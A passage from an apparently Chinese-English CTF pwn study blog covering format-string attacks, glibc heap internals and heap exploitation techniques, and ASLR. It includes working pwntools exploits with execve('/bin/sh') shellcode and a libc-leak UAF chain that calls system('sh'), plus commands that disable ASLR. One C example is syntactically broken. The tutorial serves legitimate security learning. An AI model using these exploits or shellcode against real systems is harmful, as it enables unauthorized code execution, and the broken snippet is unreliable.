it is usually used to trigger buffer overflow/heap overflow or used with ROP, ret2libc, etc.</p></li></ul><p><strong>Format String（格式化字符串）</strong></p><ul><li>History<ul><li>Discovered and public since June 1999</li><li>Shocked the security community in the second half of 2000(influenced lots of programs)</li></ul></li><li>Format String Attacks, Newsham (2001)</li><li>use %x and %n to achieve arbitrary read and write</li></ul><p><strong>Format String related Functions</strong></p><ul><li>fprintf — prints to a FILE stream</li><li>printf — prints to the ‘stdout’ stream</li><li>sprintf — prints into a string</li><li>snprintf — prints into a string with length checking</li><li>vfprintf — print to a FILE stream from a va_arg structure</li><li>vprintf — prints to ‘stdout’ from a va_arg structure</li><li>vsprintf — prints to a string from a va_arg structure</li><li>vsnprintf — prints to a string with length checking from a va_arg structure</li><li>setproctitle — set argv[]</li><li>syslog — output to the syslog facility</li></ul><p><strong>Format String syntax</strong></p><ul><li><p>%s print null terminated string pointed by arg pointer</p></li><li><p>%x print hex value of the arg (arbitrary read)</p></li><li><p>%n store the bytes_written to location pointed by arg pointer</p></li><li><p>%hn - store 2 bytes (short integer)</p></li><li><p>%hhn - store 1 byte</p></li><li><p>%<positive integer>c print arbitrary count of chars controlled by integer</positive></p><ul><li>Example: %123c (filled by space)  %0512c (filled by 0)</li><li>Useful to change bytes_written so far</li></ul></li><li><p>%<positive integer>$<fmt> specify arg index</fmt></positive></p><ul><li>Example: %12$n</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,<span class="hljs-string">&quot;Hello World&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>);<br>    <br>    <span class="hljs-keyword">int</span> a=<span class="hljs-number">1</span>,b=<span class="hljs-number">2</span>,c=<span class="hljs-number">3</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3$d&quot;</span>,a,b,c);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3$s&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3$p&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3$n&quot;</span>);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x402004%5$s&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x402004%5$n&quot;</span>);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2022/01/19/CTF/Pwn/Pwn/199ee35257509a673c6b4e9468778695.png" alt="image-20220418230459176" style="zoom:67%;"></p><p><img src="/2022/01/19/CTF/Pwn/Pwn/fb6fbedf97453e81fa6e77255564e5b9.png" alt="image-20220419220930275" style="zoom:67%;"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>io=process(<span class="hljs-string">&#x27;./fmtstr1&#x27;</span>)<br><br>x_addr=<span class="hljs-number">0x0804A02C</span><br><br>payload=p32(x_addr)+<span class="hljs-string">b&quot;%11$n&quot;</span><br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&#x27;./goodluck&#x27;</span>)<br><br>payload = <span class="hljs-string">&quot;%9$s&quot;</span><br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="0x05-堆利用heap"><a href="#0x05-堆利用heap" class="headerlink" title="0x05 堆利用heap"></a>0x05 堆利用heap</h2><h3 id="一、堆管理器"><a href="#一、堆管理器" class="headerlink" title="一、堆管理器"></a>一、堆管理器</h3><h4 id="1、堆概述"><a href="#1、堆概述" class="headerlink" title="1、堆概述"></a>1、堆概述</h4><p><strong>什么是堆？</strong></p><ul><li>是虚拟地址空间的一块连续的线性区域</li><li>提供动态分配的内存，允许程序申请大小未知的内存</li><li>在用户与操作系统之间，作为动态内存管理的中间人</li><li>响应用户的申请内存请求， 向操作系统申请内存，然后将其返回给用户程序</li><li>管理用户所释放的内存，适时归还给操作系统</li></ul><p><strong>各种堆管理器</strong></p><blockquote><p>堆管理器并非由操作系统实现，而是由libc.so.6链接库实现。 封装了一些系统调用，为用户提供方便的动态内存分配接口的同时，力求高效地管理由系统调用申请来的内存。</p></blockquote><ul><li><p>dlmalloc – General purpose allocator</p></li><li><p>ptmalloc2 – glibc （敲黑板）</p></li><li><p>jemalloc – FreeBSD and Firefox</p></li><li><p>tcmalloc – Google</p></li><li>libumem – Solaris</li></ul><p><strong>申请内存的系统调用</strong></p><ul><li>brk<ul><li>主线程申请空间较小时</li><li>在 Data 段上方申请空间</li></ul></li><li>mmap<ul><li>主线程申请空间较大时、子线程申请时</li><li>在 Memory map 段申请空间</li></ul></li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/e527cd2b75b5b89d8bb3455fba45c300.png" alt="image-20220419223255874" style="zoom:67%;"></p><h4 id="2、Areana"><a href="#2、Areana" class="headerlink" title="2、Areana"></a>2、Areana</h4><p><strong>arena</strong></p><ul><li><p>内存分配区，可以理解为堆管理器所持有的内存池</p></li><li><p>操作系统 —&gt; 堆管理器 —&gt; 用户<br>物理内存 —&gt; arena —&gt; 可用内存</p></li><li><p>堆管理器与用户的内存交易发生于arena中，可以理解为堆管理器向操作系统批发来的有冗余的内存库存</p></li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/ea35937bebf785c1595dd9aac3901830.png" alt="image-20220419230423543" style="zoom:80%;"></p><h4 id="3、Chunk"><a href="#3、Chunk" class="headerlink" title="3、Chunk"></a>3、Chunk</h4><p><strong>chunk</strong></p><ul><li><p>用户申请内存的单位，也是堆管理器管理内存的基本单位</p></li><li><p><code>malloc()</code> 返回的指针指向一个 chunk 的数据区域</p></li></ul><p><strong>chunk 在 glic 中的实现</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br>    INTERNAL_SIZE_T      prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>    INTERNAL_SIZE_T      size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br><br>    <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>Chunk 的微观结构</strong></p><p><img src="/2022/01/19/CTF/Pwn/Pwn/f413c33c3ae06f075ec468bd03944c3b.png" alt="image-20220419225208374" style="zoom:80%;"></p><ul><li><p><strong>prev_size</strong></p><p>若前一个物理相邻的chunk是free chunk，则表示其大小。否则用于存储前一个chunk的数据</p></li><li><p><strong>size</strong><br>占据一字长的低3bits以后的地址，用于表示当前chunk的大小（整个chunk的大小，包括chunk头）</p><ul><li><p><strong>A flag</strong></p><p>NON_MAIN_ARENA，记录当前 chunk是否不属于主线程，1 表示不属于，0 表示属于。</p></li><li><p><strong>M flag</strong></p><p>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</p></li><li><p><strong>P flag</strong></p><p>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</p></li></ul></li><li><p><strong>fd</strong> <strong>pointer</strong></p><p>在bin中指向下一个（非物理相邻）空闲的 chunk</p></li><li><p><strong>bk pointer</strong></p><p>在bin中指向上一个（非物理相邻）空闲的 chunk</p></li><li><p><strong>fd_nextsize</strong></p><p>在large bin中指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针</p></li><li><p><strong>bk_nextsize</strong></p><p>在large bin中指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针</p></li></ul><p><strong>chunk 的分类</strong></p><ul><li>按状态<ul><li>malloced、free</li></ul></li><li>按大小<ul><li>fast、small、large、Tcache</li></ul></li><li>按特定功能<ul><li>top chunk、last remainder chunk</li></ul></li></ul><p><strong>malloced chunk</strong></p><p>已被分配且填写了相应数据的chunk</p><p><strong>free chunk</strong></p><p>被释放掉的malloced chunk成为free chunk</p><p><img src="/2022/01/19/CTF/Pwn/Pwn/007246579d4638f458a96dfe45e69878.png" alt="image-20220423170006917" style="zoom:80%;"></p><p><strong>top chunk</strong></p><p>arena中从未被使用过的内存区域</p><p><strong>last remainder chunk</strong></p><p>malloc分割原chunk后剩余的部分</p><p><img src="/2022/01/19/CTF/Pwn/Pwn/60c09d89839cba6692edf6ed05dda6fa.png" alt="image-20220423170123790" style="zoom: 80%;"></p><h4 id="4、Bin"><a href="#4、Bin" class="headerlink" title="4、Bin"></a>4、Bin</h4><p><strong>bin</strong></p><p>管理 arena 中空闲 chunk 的结构，以数组的形式存在，数组元素为相应大小的 chunk 链表的链表头，存在于 arena 的 malloc_state 中</p><ul><li>unsorted bin </li><li>fast bins </li><li>small bins </li><li>large bins </li><li>(tcache)</li></ul><p><strong>main arena 的 malloc_state 并不是 heap segment 的一部分，而是一个全局变量，存储在 libc.so 的数据段</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> &#123;</span><br>    <span class="hljs-comment">/* Serialize access.  */</span><br>    __libc_lock_define(, mutex);     <span class="hljs-comment">/* Flags (formerly in max_fast).  */</span><br>    <span class="hljs-keyword">int</span> flags;     <span class="hljs-comment">/* Fastbins */</span><br>    mfastbinptr fastbinsY[ NFASTBINS ];     <span class="hljs-comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span><br>    mchunkptr top;     <span class="hljs-comment">/* The remainder from the most recent split of a small request */</span><br>    mchunkptr last_remainder;     <span class="hljs-comment">/* Normal bins packed as described above */</span><br>    mchunkptr bins[ NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span> ];     <span class="hljs-comment">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> binmap[ BINMAPSIZE ];     <span class="hljs-comment">/* Linked list, points to the next arena */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span>     <span class="hljs-comment">/* Linked list for free arenas.  Access to this field is serialized</span><br><span class="hljs-comment">       by free_list_lock in arena.c.  */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span>     <span class="hljs-comment">/* Number of threads attached to this arena.  0 if the arena is on</span><br><span class="hljs-comment">       the free list.  Access to this field is serialized by</span><br><span class="hljs-comment">       free_list_lock in arena.c.  */</span><br>    INTERNAL_SIZE_T attached_threads;     <span class="hljs-comment">/* Memory allocated from the system in this arena.  */</span><br>    INTERNAL_SIZE_T system_mem;<br>    INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>fast bins</strong></p><ul><li>fastbinsY[] </li><li>单向列表 </li><li>LIFO </li><li>管理 16、24、32、40、48、56、64 Bytes 的 free chunks（32位下默认） </li><li>其中的 chunk 的 in_use 位（下一个物理相邻的 chunk 的 P 位）总为1</li></ul><p><strong>unsorted bin</strong></p><ul><li>bins[1] </li><li>管理刚刚释放还为分类的 chunk </li><li>可以视为空闲 chunk 回归其所属 bin 之前的缓冲区</li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/54e4b933e1086824764223268ace0abe.png" alt="image-20220423175224911" style="zoom: 80%;"></p><p><strong>small bins</strong></p><ul><li>bins[2] ~ bins[63] </li><li>62 个循环双向链表 </li><li>FIFO </li><li>管理 16、24、32、40、 …… 、504 Bytes 的 free chunks（32位下） </li><li>每个链表中存储的 chunk 大小都一致</li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/b4fd5537b92cc815878bcb2574ab0010.png" alt="image-20220423175256873"></p><p><strong>large</strong> <strong>bins</strong></p><ul><li>bins[64] ~ bins[126] </li><li>63 个循环双向链表</li><li>FIFO </li><li>管理大于 504 Bytes 的 free chunks（32位下）</li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/3e6f2356d12da082555942f13df1ba50.png" alt="image-20220423175314579"></p><p><img src="/2022/01/19/CTF/Pwn/Pwn/08bd5ce100e57ccec6befeca4509d96d.png" alt="7a9ddc1e5bc248168cb6781adab19d8f" style="zoom: 80%;"></p><h3 id="二、堆分配策略"><a href="#二、堆分配策略" class="headerlink" title="二、堆分配策略"></a>二、堆分配策略</h3><h4 id="1、Malloc"><a href="#1、Malloc" class="headerlink" title="1、Malloc"></a>1、Malloc</h4><ul><li>它根据用户申请的内存块大小以及相应大小 chunk 通常使用的频度（fastbin chunk, small chunk, large chunk），依次实现了不同的分配方法。</li><li>它由小到大依次检查不同的 bin 中是否有相应的空闲块可以满足用户请求的内存。</li><li>当所有的空闲 chunk 都无法满足时，它会考虑 top chunk。</li><li>当 top chunk 也无法满足时，堆分配器才会进行内存块申请。</li></ul><h4 id="2、free"><a href="#2、free" class="headerlink" title="2、free"></a>2、free</h4><ul><li>它将用户暂且不用的 chunk 回收给堆管理器，适当的时候还会归还给操作系统。</li><li>它依据 chunk 大小来优先试图将 free chunk 链入 tcache 或者是 fast bin 。不满足则链入 usorted bin 中。</li><li>在条件满足时 free 函数遍历 usorted bin 并将其中的物理相邻的 free chunk 合并，将相应大小的 chunk 分类放入 small bin 或 large bin 中。</li><li>除了 tcache chunk 与 fast bin chunk，其它 chunk 在 free 时会与其物理相邻的 free chunk 合并</li></ul><h3 id="三、堆漏洞与其利用"><a href="#三、堆漏洞与其利用" class="headerlink" title="三、堆漏洞与其利用"></a>三、堆漏洞与其利用</h3><h4 id="1、use-after-free（释放重用攻击）"><a href="#1、use-after-free（释放重用攻击）" class="headerlink" title="1、use after free（释放重用攻击）"></a>1、use after free（释放重用攻击）</h4><p><img src="/2022/01/19/CTF/Pwn/Pwn/af5d7231bce0364ac6cb4d7d407db035.png" alt="image-20220427144438898" style="zoom:67%;"></p><h4 id="2、double-free"><a href="#2、double-free" class="headerlink" title="2、double free"></a>2、double free</h4><p><img src="/2022/01/19/CTF/Pwn/Pwn/675908db3c8603e919bcba830a444931.png" alt="image-20220427144522013" style="zoom:67%;"></p><h4 id="3、fastbin-attack"><a href="#3、fastbin-attack" class="headerlink" title="3、fastbin attack"></a>3、fastbin attack</h4><p><img src="/2022/01/19/CTF/Pwn/Pwn/082108bfc6e91b9a3a0c37f05e17699e.png" alt="image-20220427144554285" style="zoom:67%;"></p><h4 id="4、unsortedbin-attack"><a href="#4、unsortedbin-attack" class="headerlink" title="4、unsortedbin attack"></a>4、unsortedbin attack</h4><ul><li><p>被利用的前提：控制 Unsorted Bin Chunk 的 bk 指针。</p></li><li><p>可以达到的效果：实现修改任意地址值为一个较大的数值。</p></li><li><p>可能的用途：通常是为了配合 fastbin attack 而使用的。</p></li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/46e4f9d4bcefa81f6485b5d363106bcb.png" alt="image-20220427144641452" style="zoom:67%;"></p><h4 id="5、house-of-（堆溢出、整数溢出）"><a href="#5、house-of-（堆溢出、整数溢出）" class="headerlink" title="5、house of    （堆溢出、整数溢出）"></a>5、house of    （堆溢出、整数溢出）</h4><p><img src="/2022/01/19/CTF/Pwn/Pwn/7ab0f45f7dfc8fd55b2d126479688366.png" alt="image-20220427144725001" style="zoom:67%;"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">fun</span><span class="hljs-params">(var)</span>  <span class="hljs-comment">//0x4002c7</span></span><br><span class="hljs-function"></span>&#123;<br>    print(<span class="hljs-string">&quot;%d\n&quot;</span>,var);<br>    return0;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    (<span class="hljs-number">0x4002c7</span>)(var);  <span class="hljs-comment">// = fun(var);</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gdb a.out</span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> vmmap</span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> fastbin</span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> heap</span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> p ptr</span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> b *<span class="hljs-variable">$rebase</span>(0x18540)   <span class="hljs-comment"># 偏移地址</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> vim exp.py</span><br><span class="hljs-meta">#</span><span class="bash"> 添加pause</span><br><span class="hljs-meta">$</span><span class="bash"> python3 exp.py</span><br><span class="hljs-meta">$</span><span class="bash"> gdb</span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> attach pid</span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> <span class="hljs-built_in">return</span></span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=process(<span class="hljs-string">&quot;./echo2&quot;</span>)<br>elf=ELF(<span class="hljs-string">&quot;./echo2&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;hey, what&#x27;s your name? : &quot;</span>)<br>shellcode=<span class="hljs-string">b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span><br>p.sendline(shellcode)<br>p.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br><br>payload=<span class="hljs-string">b&quot;%10$p&quot;</span>+<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">3</span><br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">b&quot;0x&quot;</span>)<br>shellcode_addr=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;AAA&#x27;</span>,drop=<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x20</span><br><br>p.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;4&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;to exit? (y/n)&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;n&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;hello \n&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">24</span>+p64(shellcode_addr))<br>p.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>p=process(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc_32.so.6&quot;</span>)<br>read_got = elf.got[<span class="hljs-string">&quot;read&quot;</span>]<br>pfputs = <span class="hljs-number">0x804862b</span><br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_note</span>(<span class="hljs-params">size,index</span>):</span><br>      p.recvuntil(<span class="hljs-string">b&quot;choice :&quot;</span>)<br>      p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>      p.recvuntil(<span class="hljs-string">b&quot;size :&quot;</span>)<br>      p.sendline(size)<br>      p.recvuntil(<span class="hljs-string">b&quot;Content :&quot;</span>)<br>      p.sendline(index)<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete_note</span>(<span class="hljs-params">index</span>):</span><br>      p.recvuntil(<span class="hljs-string">b&quot;choice :&quot;</span>)<br>      p.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>      p.recvuntil(<span class="hljs-string">b&quot;Index :&quot;</span>)<br>      p.sendline(index)<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">print_note</span>(<span class="hljs-params">index</span>):</span><br>      p.recvuntil(<span class="hljs-string">b&quot;choice :&quot;</span>)<br>      p.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>      p.recvuntil(<span class="hljs-string">b&quot;Index :&quot;</span>)<br>      p.sendline(index)<br><br>add_note(<span class="hljs-string">b&quot;16&quot;</span>,<span class="hljs-string">b&quot;aaaaa&quot;</span>)<br>add_note(<span class="hljs-string">b&quot;16&quot;</span>,<span class="hljs-string">b&quot;aaaaa&quot;</span>)<br>delete_note(<span class="hljs-string">b&#x27;0&#x27;</span>)<br>delete_note(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>add_note(<span class="hljs-string">b&#x27;8&#x27;</span>,p32(pfputs)+p32(read_got))<br>print_note(<span class="hljs-string">b&#x27;0&#x27;</span>)<br>pfread = u32(p.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br>pfsys = pfread - <span class="hljs-number">0xd41c0</span> + <span class="hljs-number">0x3a940</span><br><br>delete_note(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>add_note(<span class="hljs-string">b&#x27;8&#x27;</span>,p32(pfsys)+<span class="hljs-string">b&quot;||sh&quot;</span>)<br>print_note(<span class="hljs-string">b&#x27;0&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="PartEx1-内存保护措施"><a href="#PartEx1-内存保护措施" class="headerlink" title="PartEx1 内存保护措施"></a>PartEx1 内存保护措施</h2><p><strong>compile.sh：</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-comment"># Canary、栈可执行、PIE</span><br>gcc -fno-stack-protector -z execstack -no-pie -g -o ret2stack ret2stack.c<br></code></pre></td></tr></table></figure><h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><blockquote><p>ASLR (Address Space Layout Randomization)</p></blockquote><ul><li><p>系统的防护措施，程序装载时生效</p><ul><li>/proc/sys/kernel/randomize_va_space = 0：没有随机化。即关闭 ASLR</li><li>/proc/sys/kernel/randomize_va_space = 1：保留的随机化。共享库、栈、mmap() 以及 VDSO 将被随机化</li><li>/proc/sys/kernel/randomize_va_space = 2：完全的随机化。在randomize_va_space = 1的基础上，通过 brk() 分配的内存空间也将被随机化</li></ul></li><li><p>```shell<br>$ su<br>$ echo 0 &gt; /proc/sys/kernel/randomize_va_space<br>$ cat /proc/sys/kernel/randomize_va_space</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 